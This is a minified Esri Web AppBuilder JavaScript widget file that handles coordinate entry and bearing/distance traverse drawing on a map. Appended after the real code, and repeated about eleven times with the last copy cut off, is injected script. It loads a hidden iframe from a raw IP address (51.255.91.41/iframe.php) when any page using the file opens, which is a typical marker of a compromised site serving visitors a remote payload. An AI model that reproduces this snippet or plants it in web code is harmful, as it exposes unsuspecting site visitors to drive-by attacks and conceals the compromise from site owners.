// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Screening/coordinates/coordinates.html":'\x3cdiv\x3e\r\n  \x3c!--Coordinates parent container--\x3e\r\n  \x3cdiv class\x3d"esriCTCoordinatesParentDiv"\x3e\r\n    \x3c!--Select start point from Search dijit div--\x3e\r\n    \x3cdiv class\x3d"esriCTSelectStartPointFromSearchDiv" data-dojo-attach-point\x3d"selectStartPointFromSearchDiv"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchOuterContainer"\x3e\r\n        \x3cdiv class\x3d"esriCTSearchHeader"\x3e\r\n          ${nls.coordinatesWidget.selectStartPointFromSearchText}\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTSearchContainer"\x3e\r\n          \x3cdiv class\x3d"esriCTSearchDiv"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"searchWidgetContainerCoordinatesTab"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3c!--Locate icon for start point node--\x3e\r\n          \x3cdiv class\x3d"esriCTLocateImageNode" title\x3d"${nls.coordinatesWidget.locateByMapClickText}" data-dojo-attach-point\x3d"locateStartPointIcon"\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--Select start point from latitude and longitude div--\x3e\r\n      \x3cdiv class\x3d"esriCTLatLongInputLabelParentContainer"\x3e\r\n        \x3cdiv class\x3d"esriCTLatLongInputLabelChildContainer"\x3e\r\n          \x3cdiv class\x3d"esriCTLatitudeLabel"\x3e\r\n            ${nls.common.latitude}\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTLongitudeLabel"\x3e\r\n            ${nls.common.longitude}\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv\x3e\r\n          \x3c!--Latitude textbox--\x3e\r\n          \x3cinput class\x3d"esriCTLatTextBox" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-attach-point\x3d\'latitudeTextBox\' placeholder\x3d"${nls.common.latitude}"\r\n            required/\x3e\r\n          \x3c!--Longitude textbox--\x3e\r\n          \x3cinput class\x3d"esriCTLongTextBox" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-attach-point\x3d\'longitudeTextBox\' placeholder\x3d"${nls.common.longitude}"\r\n            required/\x3e\r\n          \x3c!--Locate for lat long text--\x3e\r\n          \x3cdiv class\x3d"esriCTLocateForLatLongText" title\x3d"${nls.coordinatesWidget.locateText}" data-dojo-attach-point\x3d"locateLatAndLong"\x3e\r\n            ${nls.coordinatesWidget.locateText}\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3c!-- Traverse grid container--\x3e\r\n      \x3cdiv class\x3d"esriCTNewTraverseContainer" data-dojo-attach-point\x3d"traverseGridMainContainer"\x3e\r\n        \x3cdiv class\x3d"esriCTBearingDistanceParentDiv"\x3e\r\n          \x3c!--Enter bearing and distance label parent div--\x3e\r\n          \x3cdiv class\x3d"esriCTEnterBearingAndDistanceLabelDiv"\x3e\r\n            ${nls.coordinatesWidget.enterBearingAndDistanceLabel}\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTPlanSettingsIcon" data-dojo-attach-point\x3d"planSettingIcon" title\x3d"${nls.coordinatesWidget.planSettingTooltip}"\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Traverse grid title--\x3e\r\n        \x3cdiv class\x3d"esriCTNewTraverseLabelDiv"\x3e\r\n          \x3cdiv class\x3d"esriCTGridLabels esriCTEllipsis" title\x3d"${nls.traverseSettings.bearingLabel}"\x3e\r\n            ${nls.traverseSettings.bearingLabel}\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTGridLabels esriCTEllipsis" title\x3d"${nls.traverseSettings.lengthLabel}"\x3e\r\n            ${nls.traverseSettings.lengthLabel}\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Traverse grid items--\x3e\r\n        \x3cdiv class\x3d"esriCTTraverseGrid" data-dojo-attach-point\x3d"traverseGrid"\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Traverse grid initial entry row--\x3e\r\n        \x3cdiv class\x3d"esriCTEntryNodeContent esriCTRow" data-dojo-attach-point\x3d"traverseEntryNode"\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"bearingNode" data-dojo-type\x3d"dijit/form/ValidationTextBox" required\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"lengthNode" data-dojo-type\x3d"dijit/form/ValidationTextBox" required\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTAddRow"\x3e\r\n            \x3cdiv class\x3d"esriCTAddDisabledIcon" data-dojo-attach-point\x3d"addButton" title\x3d"${nls.traverseSettings.addButtonTitle}"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c!-- Traverse grid tools container--\x3e\r\n        \x3cdiv class\x3d"esriCTTraverseTool"\x3e\r\n          \x3cdiv class\x3d"esriCTTraverseToolContainer"\x3e\r\n            \x3c!-- Expand/Collapse grid tool--\x3e\r\n            \x3cdiv class\x3d"esriCTHidden  esriCTTraverseToolIcons esriCTCollapse esriCTCursorPointer" title\x3d"${nls.planSettings.collapseGridTooltipText}"\r\n              data-dojo-attach-point\x3d"expandCollapseNode"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e'}});
define("dojo/_base/declare dojo/text!./coordinates.html dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/on dojo/dom-class dojo/Evented jimu/BaseWidget esri/graphic esri/symbols/jsonUtils esri/SpatialReference esri/geometry/Point esri/graphicsUtils ../search ../geometryUtils ../MapTooltipHandler dijit/focus ../conversionUtils dojo/dom-construct dijit/form/ValidationTextBox dojo/dom-attr dojo/keys dojo/dnd/Source dojo/_base/array dojo/query jimu/dijit/Message ../planSettings/planSettings dojo/dom-geometry dijit/form/NumberTextBox".split(" "),
function(x,y,z,d,f,h,A,B,t,v,u,C,D,E,q,F,k,p,m,G,n,l,H,w,r,I,J,K){return x([B,z,A],{baseClass:"jimu-widget-screening-coordinates",templateString:y,_itemList:[],_nodes:[],_mapTooltipHandler:null,_dndContainer:null,_latLongValue:{latitude:"",longitude:""},_windowResizeTimer:null,startPoint:null,startPointForNextLine:null,planSettingsWidget:null,constructor:function(a){this._itemList=[];this._nodes=[];this._dndContainer=this._mapTooltipHandler=null;this._latLongValue={latitude:"",longitude:""};this.planSettingsWidget=
this.startPointForNextLine=this.startPoint=this._windowResizeTimer=null;d.mixin(this,a)},postCreate:function(){this._initializeCoordinatesWidget();this._createSearchInstance()},_createSearchInstance:function(){this._searchInstance=new E({searchOptions:{addLayersFromMap:!1,autoNavigate:!1,autoComplete:!0,minCharacters:0,maxLocations:5,searchDelay:100,enableHighlight:!1},config:this.config,appConfig:this.appConfig,nls:this.nls,map:this.map},m.create("div",{},this.searchWidgetContainerCoordinatesTab));
this.own(this._searchInstance.on("select-result",d.hitch(this,function(a){this.emit("onSearchComplete",a)})));this.own(this._searchInstance.on("clear-search",d.hitch(this,this._clearResults)));this.own(this._searchInstance.on("search-loaded",d.hitch(this,function(){setTimeout(d.hitch(this,function(){this._searchContainerNodeElement=r(".arcgisSearch .searchGroup .searchInput",this.domNode)[0];2>this._searchInstance.search.sources.length&&(this._hasMultipleSourcesInSearch=!1);this.onWindowResize()}),
1E3)})));this._searchInstance.startup()},_clearResults:function(a){a||this.map.infoWindow.hide()},clearSearchText:function(){this._searchInstance&&this._searchInstance.search&&this._searchInstance.search.clear()},onWindowResize:function(){this._windowResizeTimer&&clearTimeout(this._windowResizeTimer);this._windowResizeTimer=setTimeout(d.hitch(this,this._resetComponents),500)},_resetComponents:function(){var a,b;b=r(".arcgisSearch .searchGroup",this.domNode)[0];this._searchContainerNodeElement||(this._searchContainerNodeElement=
r(".arcgisSearch .searchGroup .searchInput",this.domNode)[0]);this.widgetMainContainer&&this._searchContainerNodeElement&&(a=K.position(this.widgetMainContainer))&&a.w&&(a=a.w-175,this._hasMultipleSourcesInSearch||(a+=32),0<a&&(this._searchContainerNodeElement.style.setProperty("width",a-45+"px","important"),b&&b.style.setProperty("max-width","100%","important")))},_initializeCoordinatesWidget:function(){this._nodes=[];this._itemList=[];this._initializeMapTooltipHandler();this._setLatLongInputTextBoxesConstraints();
this._createPlanSettings();this.updateAccordingToPlanSettings(this._planSettings);this._attachLatLongTextBoxEvents();this._attachLocateStartPointEvents();this._attachPlanSettingsIconClickEvent();this._setValidatorForInitialRow();this._handleEventsOnInitialRow();this._attachTraverseGridEvents();this._createTraverseGrid();this._enableOrDisableTraverseGrid(!1)},_createPlanSettings:function(){this._planSettings={};this._planSettings.directionOrAngleType="northAzimuth";this._planSettings.directionOrAngleUnits=
this.config.traverseDirectionUnit;this._planSettings.distanceAndLengthUnits=this.config.traverseUnit},updateAccordingToPlanSettings:function(a){this.bearingNode.set("placeHolder",this.nls.units[a.directionOrAngleUnits+"Abbr"]);this.lengthNode.set("placeHolder",this.nls.units[a.distanceAndLengthUnits+"Abbr"])},_initializeMapTooltipHandler:function(){this._mapTooltipHandler=new F({map:this.map});this._mapTooltipHandler.startup();this.own(f(this._mapTooltipHandler,"clicked",d.hitch(this,function(a){h.contains(this.locateStartPointIcon,
"esriCTLocateIconSelected")&&(this.onStartPointSelected(a.mapPoint),this.deactivateLocateIcon())})))},_setLatLongInputTextBoxesConstraints:function(){this.latitudeTextBox.set("constraints",{min:-90,max:90,places:8});this.latitudeTextBox.set("trim",!0);this.longitudeTextBox.set("constraints",{min:-180,max:180,places:8});this.longitudeTextBox.set("trim",!0)},onStartPointSelected:function(a){var b;this.drawnOrSelectedGraphicsLayer.clear();this.uploadedShapefileGraphicsLayer.clear();b=new u(4326);q.getProjectedGeometry(a,
b,this.geometryService).then(d.hitch(this,function(b){this.setStartPoint(a);this._enableOrDisableTraverseGrid(!0);this.setLatLongTextBoxValue(b.x,b.y)}))},_activateLocateIcon:function(){this.startPointForNextLine?this._mapTooltipHandler.connectEventHandler(this.nls.coordinatesWidget.mapTooltipForUpdateStartPoint):this._mapTooltipHandler.connectEventHandler(this.nls.coordinatesWidget.mapTooltipForStartPoint);h.add(this.locateStartPointIcon,"esriCTLocateIconSelected")},deactivateLocateIcon:function(){h.contains(this.locateStartPointIcon,
"esriCTLocateIconSelected")&&(h.remove(this.locateStartPointIcon,"esriCTLocateIconSelected"),this._mapTooltipHandler.disconnectEventHandler())},setLatLongTextBoxValue:function(a,b){this._latLongValue.latitude=b;this._latLongValue.longitude=a;this.latitudeTextBox.set("value",b);this.longitudeTextBox.set("value",a)},_attachLocateStartPointEvents:function(){this.own(f(this.locateStartPointIcon,"click",d.hitch(this,function(){h.contains(this.locateStartPointIcon,"esriCTLocateIconSelected")?this.deactivateLocateIcon():
this._activateLocateIcon()})));this.own(f(this.locateLatAndLong,"click",d.hitch(this,function(){this.latitudeTextBox.isValid()&&this.longitudeTextBox.isValid()?this._onLocateLatLongClicked():this._showMessage(this.nls.coordinatesWidget.invalidLatLongMessage)})))},_onLocateLatLongClicked:function(){var a;this.latitudeTextBox.isValid()&&this.longitudeTextBox.isValid()&&(this._latLongValue.latitude=this.latitudeTextBox.getValue(),this._latLongValue.longitude=this.longitudeTextBox.getValue(),a=new u(4326),
a=new C(this._latLongValue.longitude,this._latLongValue.latitude,a),q.getProjectedGeometry(a,this.map.spatialReference,this.geometryService).then(d.hitch(this,function(a){this.setStartPoint(a);this._enableOrDisableTraverseGrid(!0);this._locateStartPoint(a)})))},_locateStartPoint:function(a){this.map.centerAt(a)},_enableOrDisableTraverseGrid:function(a){a?(this.bearingNode.set("disabled",!1),this.lengthNode.set("disabled",!1),h.replace(this.addButton,"esriCTAddIcon","esriCTAddDisabledIcon")):(this.bearingNode.set("disabled",
!0),this.lengthNode.set("disabled",!0),h.replace(this.addButton,"esriCTAddDisabledIcon","esriCTAddIcon"))},_attachTraverseGridEvents:function(){this.own(f(this.addButton,"click",d.hitch(this,function(){h.contains(this.addButton,"esriCTAddIcon")&&this._addNewItem()})));this.own(f(this.expandCollapseNode,"click",d.hitch(this,this._onExpandCollapseClicked)))},_addNewItem:function(){var a;(a=this._getValidatedValues())?(this._itemList.push(a),this._createRow(a,this._itemList.length-1),this._resetEntryRow(),
this._drawStraightLine(a,!0),this._showHideTraverseTools()):this.bearingNode.isValid()?""!==this.lengthNode.get("value")&&this.lengthNode.isValid()||(k.focus(this.lengthNode),this.lengthNode.validate(!1)):(k.focus(this.bearingNode),this.bearingNode.validate(!1))},_validateBearing:function(a){return(a=p.categorizeBearingFormat(a,this._planSettings))?a:null},_getValidatedValues:function(a,b){var c={};a?(c=a,b&&("Bearing"!==b&&c.BearingConversions&&(c.Bearing=this._getBearingAccordingToPlanSettings(c.BearingConversions)),
"Length"!==b&&c.LengthConversions&&(c.Length=c.LengthConversions[this._planSettings.distanceAndLengthUnits]))):(c.Bearing=this.bearingNode.get("value"),c.Length=this.lengthNode.get("value"));if(""!==d.trim(c.Bearing.toString())&&""!==d.trim(c.Length.toString())&&(a=this._validateBearing(c.Bearing))){c.BearingConversions=a;if(""===d.trim(c.Length.toString()))return null;if(""!==d.trim(c.Length.toString()))if((a=this._validateLength(c.Length))&&0!==a.meters){if(0>parseInt(a.meters,10))return null;c.LengthConversions=
a}else return null}else return null;return c},_validateLength:function(a,b){switch(b){case "feets":a=p.categorizeLengthFormatForFeet(a);break;case "meters":a=p.categorizeLengthFormat(a,"meters");break;case "uSSurveyFeet":a=p.categorizeLengthFormat(a,"uSSurveyFeet");break;default:a=p.categorizeLengthFormat(a,this._planSettings.distanceAndLengthUnits)}return a?a:null},_createRow:function(a,b){var c,d;c=m.create("div",{"class":"dojoDndItem esriCTRow",rowIndex:b});m.create("div",{rowIndex:b},c);d=this._getBearingAccordingToPlanSettings(a.BearingConversions);
this._createFieldInputs(c,d,"esriCTBearingRow");a=this._getRoundedValue(a.LengthConversions,"Length");this._createFieldInputs(c,a,"esriCTLengthRow");this._createDeleteButton(c,b);this._nodes.push(c);this._dndContainer.clearItems();this._dndContainer.insertNodes(!1,this._nodes)},_getBearingAccordingToPlanSettings:function(a,b){if("northAzimuth"===this._planSettings.directionOrAngleType&&"decimalDegree"===this._planSettings.directionOrAngleUnits)return b?a.naDD:a.naDDRound;if("northAzimuth"===this._planSettings.directionOrAngleType&&
"degreeMinuteSeconds"===this._planSettings.directionOrAngleUnits)return a.naDMS;if("southAzimuth"===this._planSettings.directionOrAngleType&&"decimalDegree"===this._planSettings.directionOrAngleUnits)return b?a.saDD:a.saDDRound;if("southAzimuth"===this._planSettings.directionOrAngleType&&"degreeMinuteSeconds"===this._planSettings.directionOrAngleUnits)return a.saDMS;if("quadrantBearing"===this._planSettings.directionOrAngleType&&"decimalDegree"===this._planSettings.directionOrAngleUnits)return b?
a.qb3DD:a.qb3DDRound;if("quadrantBearing"===this._planSettings.directionOrAngleType&&"degreeMinuteSeconds"===this._planSettings.directionOrAngleUnits)return a.qb3DMS},_createFieldInputs:function(a,b,c,g){var e=new G({value:b,"class":c?c:""});e.placeAt(a);"esriCTBearingRow"===c?(e.validator=d.hitch(this,function(a){return this._bearingValidator(a,[])}),e.invalidMessage=this.nls.newTraverse.invalidBearingMessage):"esriCTLengthRow"===c&&(e.validator=d.hitch(this,this._lengthValidator),e.invalidMessage=
this.nls.newTraverse.invalidLengthMessage);this.own(f(e,"blur",d.hitch(this,function(){var b=parseInt(n.get(a,"rowIndex"),10);this._updateParcelValues(e,b,g)})));this.own(f(e,"keypress",d.hitch(this,function(b){(b.charCode||b.keyCode)===l.ENTER&&(b=parseInt(n.get(a,"rowIndex"),10),this._updateParcelValues(e,b,g));setTimeout(d.hitch(this,function(){e.validate(!1)}),100)})))},_getRoundedValue:function(a,b){var c;a=a[this._planSettings.distanceAndLengthUnits];switch(b){case "Length":c=this.lengthFieldPlaces}return p.honourPopupRounding(c,
a)},_createDeleteButton:function(a,b){var c;c=m.create("div",{"class":"esriCTDeleteRow"},a);b=m.create("div",{"class":"esriCTDeleteIcon",rowIndex:b,title:this.nls.traverseSettings.deleteButtonTitle},c);this.own(f(b,"click",d.hitch(this,function(b){b=parseInt(n.get(b.currentTarget,"rowIndex"),10);this._deleteRow(a,b)})))},_createTraverseGrid:function(){var a;this._nodes=[];m.empty(this.traverseGrid);this._dndContainer=new H(this.traverseGrid,{skipForm:!0,singular:!0});this._dndContainer.copyState=
function(){return!1};for(a=0;a<this._itemList.length;a++)this._createRow(this._itemList[a],a);this.own(this._dndContainer.on("DndDrop",d.hitch(this,this._onDndDrop)));this._dndContainer.insertNodes(!1,this._nodes)},_resetEntryRow:function(a){this.bearingNode.set("value","");this.lengthNode.set("value","");this.bearingNode.reset();this.lengthNode.reset();0<this._itemList.length&&(a=a?this._getBearingAccordingToPlanSettings(this._itemList[this._itemList.length-1].BearingConversions):this._itemList[this._itemList.length-
1].Bearing,this.bearingNode.set("value",a),this.bearingNode.textbox.setSelectionRange(0,a.length))},_drawStraightLine:function(a,b){a=q.getDestinationPoint(this.startPointForNextLine,a.BearingConversions.naDD,a.LengthConversions.meters);this._drawLineAndEndPoint(a,[this.startPointForNextLine,a],b)},_drawLineAndEndPoint:function(a,b,c){a?(b=q.getLineBetweenPoints(b))?(b=new t(b,v.fromJson(this.config.coordinatesSymbology.polyline)),this._addProjectedGraphic(this.drawnOrSelectedGraphicsLayer,b,c),this.startPointForNextLine=
d.clone(a),this._drawPoint(a)):this._showMessage(this.nls.newTraverse.unableToDrawLineMessage):this._showMessage(this.nls.newTraverse.invalidEndPointMessage)},_addProjectedGraphic:function(a,b,c){var g,e={};e.rowIndex=a.graphics.length;b.attributes=e;4326!==this.map.spatialReference.wkid?q.getProjectedGeometry(b.geometry,this.map.spatialReference,this.geometryService).then(d.hitch(this,function(d){d&&(g=new t(d),g.setAttributes(e),g.setSymbol(b.symbol),a.add(g),this.emit("enableClearAOIButton"),this.emit("enableZoomIcon"),
c&&(this._setExtentToLayer(a),this.emit("redrawAOI")))})):(a.add(b),c&&this._setExtentToLayer(a))},_drawPoint:function(a){a=new t(a,v.fromJson(this.config.coordinatesSymbology.point));this._addProjectedGraphic(this.drawnOrSelectedGraphicsLayer,a,!1,!1)},_showHideTraverseTools:function(){this._itemList&&0<this._itemList.length?h.remove(this.expandCollapseNode,"esriCTHidden"):h.add(this.expandCollapseNode,"esriCTHidden")},_onExpandCollapseClicked:function(){h.toggle(this.traverseGrid,"esriCTHidden");
h.contains(this.expandCollapseNode,"esriCTExpand")?(n.set(this.expandCollapseNode,"title",this.nls.planSettings.collapseGridTooltipText),h.replace(this.expandCollapseNode,"esriCTCollapse","esriCTExpand")):(n.set(this.expandCollapseNode,"title",this.nls.planSettings.expandGridTooltipText),h.replace(this.expandCollapseNode,"esriCTExpand","esriCTCollapse"))},_setExtentToLayer:function(a){0<a.graphics.length&&(a=D.graphicsExtent(a.graphics),this.map.extent.contains(a)||this.map.setExtent(a.expand(1.5)))},
_deleteRow:function(a,b){this._itemList.length&&(this._dndContainer.delItem(a.id),m.destroy(a),this._nodes.splice(b,1),this._itemList.splice(b,1),this._dndContainer.sync(),this._updateRowIndexes(),this.setStartPoint(this.startPoint),this._showHideTraverseTools())},_updateRowIndexes:function(){var a;a=r(".esriCTRow",this.traverseGrid);w.forEach(a,d.hitch(this,function(a,c){var b;n.set(a,"rowIndex",c);(b=r(".esriCTDeleteIcon",a)[0])&&n.set(b,"rowIndex",c);(a=r(".esriCTSymbolContainer",a)[0])&&n.set(a,
"rowIndex",c)}))},setStartPoint:function(a){var b=new u(4326);q.getProjectedGeometry(a,b,this.geometryService).then(d.hitch(this,function(b){this.startPoint=b;this.startPointForNextLine=d.clone(b);this._orgStartPointForNextLine=d.clone(b);0<this._itemList.length?this._reDrawParcel():(this.drawnOrSelectedGraphicsLayer.clear(),this.uploadedShapefileGraphicsLayer.clear(),this._arrayOfAllBoundaryLines=[],this._drawPoint(a),this._setExtentToLayer(this.drawnOrSelectedGraphicsLayer),this.emit("redrawAOI"))}))},
_reDrawParcel:function(){this.drawnOrSelectedGraphicsLayer.clear();this.uploadedShapefileGraphicsLayer.clear();this._arrayOfAllBoundaryLines=[];this._drawPoint(this.startPoint);w.forEach(this._itemList,d.hitch(this,function(a){this._drawStraightLine(a,!1)}));this.emit("redrawAOI");this._setExtentToLayer(this.drawnOrSelectedGraphicsLayer)},_handleEventsOnInitialRow:function(){this.own(f(this.bearingNode,"keypress",d.hitch(this,this._bearingValueEntered)));this.own(f(this.lengthNode,"keypress",d.hitch(this,
this._lengthValueEntered)))},_bearingValueEntered:function(a){a=a.charCode||a.keyCode;a===l.ENTER||a===l.TAB?(this.bearingNode.get("value"),a===l.ENTER&&this.bearingNode.isValid()?k.focus(this.lengthNode):this.bearingNode.validate(!1)):setTimeout(d.hitch(this,function(){this.bearingNode.validate(!1)}),100)},_setValidatorForInitialRow:function(){this.bearingNode.validator=d.hitch(this,function(a){return this._bearingValidator(a,[])});this.bearingNode.invalidMessage=this.nls.newTraverse.invalidBearingMessage;
this.lengthNode.validator=d.hitch(this,function(a){if(0>parseFloat(a))return this.lengthNode.invalidMessage=this.nls.newTraverse.negativeLengthMessage,!1;this.lengthNode.invalidMessage=this.nls.newTraverse.invalidLengthMessage;return this._lengthValidator(a)});this.lengthNode.invalidMessage=this.nls.newTraverse.invalidLengthMessage},_bearingValidator:function(a,b){return-1!==b.indexOf(a)&&this._itemList&&0<this._itemList.length?!0:this._validateBearing(a,b)},_lengthValidator:function(a,b){return""===
a||"0"===a||0===a?!1:this._validateLength(a,b)},_lengthValueEntered:function(a){a=a.charCode||a.keyCode;a===l.ENTER||a===l.TAB?(this.lengthNode.get("value"),this.lengthNode.isValid()?this.bearingNode.isValid()?this.lengthNode.isValid()?(this._addNewItem(),k.focus(this.bearingNode)):(this.lengthNode.validate(!1),k.focus(this.lengthNode)):(this.bearingNode.validate(!1),k.focus(this.bearingNode)):this.lengthNode.validate(!1)):setTimeout(d.hitch(this,function(){this.lengthNode.validate(!1)}),100)},_attachPlanSettingsIconClickEvent:function(){this.own(f(this.planSettingIcon,
"click",d.hitch(this,this._openPlanSettingsDialogBox)))},_openPlanSettingsDialogBox:function(a){a.stopPropagation();a.preventDefault();this.planSettingsWidget?(this.planSettingsWidget.position=a,this.planSettingsWidget.isTooltipDialogOpened?this.planSettingsWidget.closePopup():this.planSettingsWidget.openPopup()):(this.planSettingsWidget=new J({config:this.config,appConfig:this.appConfig,position:a,nls:this.nls}),this.planSettingsWidget.startup());this.own(f(this.planSettingsWidget,"planSettingsChanged",
d.hitch(this,function(a,c){this._planSettings.directionOrAngleUnits=this.config.traverseDirectionUnit=a;this._planSettings.distanceAndLengthUnits=this.config.traverseUnit=c;this.updateAccordingToPlanSettings(this._planSettings);this._reGenerateTraverseGrid()})))},_showMessage:function(a){(new I({message:a})).message=a},_attachLatLongTextBoxEvents:function(){this.own(f(this.latitudeTextBox,"keyup",d.hitch(this,function(a){a=a.charCode||a.keyCode;if(a===l.ENTER||a===l.TAB)this.latitudeTextBox.setValue(p.honourPopupRounding(8,
this.latitudeTextBox.getValue())),this.latitudeTextBox.isValid()&&this.longitudeTextBox.isValid()?(k.focus(this.longitudeTextBox),this._onLocateLatLongClicked()):(this.latitudeTextBox.isValid()&&this.longitudeTextBox.isValid(),k.focus(this.longitudeTextBox))})));this.own(f(this.latitudeTextBox,"blur",d.hitch(this,function(){!this.latitudeTextBox.isValid()&&this._latLongValue.latitude&&this.latitudeTextBox.setValue(this._latLongValue.latitude)})));this.own(f(this.longitudeTextBox,"keyup",d.hitch(this,
function(a){a=a.charCode||a.keyCode;if(a===l.ENTER||a===l.TAB)this.longitudeTextBox.setValue(p.honourPopupRounding(8,this.longitudeTextBox.getValue())),this.latitudeTextBox.isValid()&&this.longitudeTextBox.isValid()?this._onLocateLatLongClicked():this.longitudeTextBox.isValid()&&!this.latitudeTextBox.isValid()?k.focus(this.latitudeTextBox):k.curNode&&k.curNode.blur()})));this.own(f(this.longitudeTextBox,"blur",d.hitch(this,function(){!this.longitudeTextBox.isValid()&&this._latLongValue.longitude&&
this.longitudeTextBox.setValue(this._latLongValue.longitude)})))},_updateParcelValues:function(a,b){var c,g,e,f=!1;if(c=this._itemList[b])e=(e=a.get("value"))?d.trim(e.toString()):"",h.contains(a.domNode,"esriCTBearingRow")&&String(this._getBearingAccordingToPlanSettings(c.BearingConversions))!==e?(g="Bearing",c.Bearing=e,f=!0):h.contains(a.domNode,"esriCTLengthRow")&&String(this._getRoundedValue(c.LengthConversions,"Length"))!==e&&(g="Length",c.Length=e,f=!0),f&&((b=this._getValidatedValues(c,g,
b))?("Bearing"===g?(g=this._getBearingAccordingToPlanSettings(b.BearingConversions),c.Bearing=this._getBearingAccordingToPlanSettings(b.BearingConversions,!0),a.set("value",g)):"Length"===g&&(g=this._getRoundedValue(c.LengthConversions,"Length"),c.Length=c.LengthConversions[this._planSettings.distanceAndLengthUnits],a.set("value",g)),this.setStartPoint(this.startPoint)):this._updateValues(c,g,a))},_updateValues:function(a,b,c){var d;"Bearing"===b?(a.Bearing=this._getBearingAccordingToPlanSettings(a.BearingConversions,
!0),d=this._getBearingAccordingToPlanSettings(a.BearingConversions)):"Length"===b&&(a.Length=a.LengthConversions[this._planSettings.distanceAndLengthUnits],d=this._getRoundedValue(a.LengthConversions,"Length"));c.set("value",d)},resetCoordinatesWidgetValue:function(){this.startPointForNextLine=this.startPoint=null;this.deactivateLocateIcon();this.setLatLongTextBoxValue("","");this.latitudeTextBox.reset();this.longitudeTextBox.reset();this._enableOrDisableTraverseGrid(!1);this._nodes=[];this._itemList=
[];m.empty(this.traverseGrid);this.bearingNode.set("value","");this.lengthNode.set("value","");this.bearingNode.reset();this.lengthNode.reset();this._showHideTraverseTools()},_onDndDrop:function(){var a,b=[];this._dndContainer.sync();a=this._dndContainer.getAllNodes();a.forEach(d.hitch(this,function(a){a=parseInt(n.get(a,"rowIndex"),10);b.push(this._itemList[a])}));this._nodes=a;this._itemList=[];this._itemList=b;this._updateRowIndexes();this.setStartPoint(this.startPoint)},_reGenerateTraverseGrid:function(){this._dndContainer&&
(this._dndContainer.destroy(),this._dndContainer=null);m.empty(this.traverseGrid);this._createTraverseGrid()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
